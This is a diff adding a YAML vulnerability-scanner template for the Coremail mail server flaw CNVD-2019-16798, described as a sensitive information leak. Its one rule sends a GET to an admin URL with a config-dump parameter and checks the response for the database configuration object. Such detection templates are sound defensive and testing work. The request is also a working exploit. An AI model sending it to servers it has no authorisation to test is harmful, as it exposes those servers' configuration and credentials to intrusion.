@@ -1,0 +1,12 @@
+name: coremail-cnvd-2019-16798
+description: >
+  敏感信息泄露
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: >-
+      /mailsms/s?func=ADMIN:appState&dumpConfig=/
+    expression:
+      status: 200
+      body_all: ["<object name=\"cm_md_db\">"]
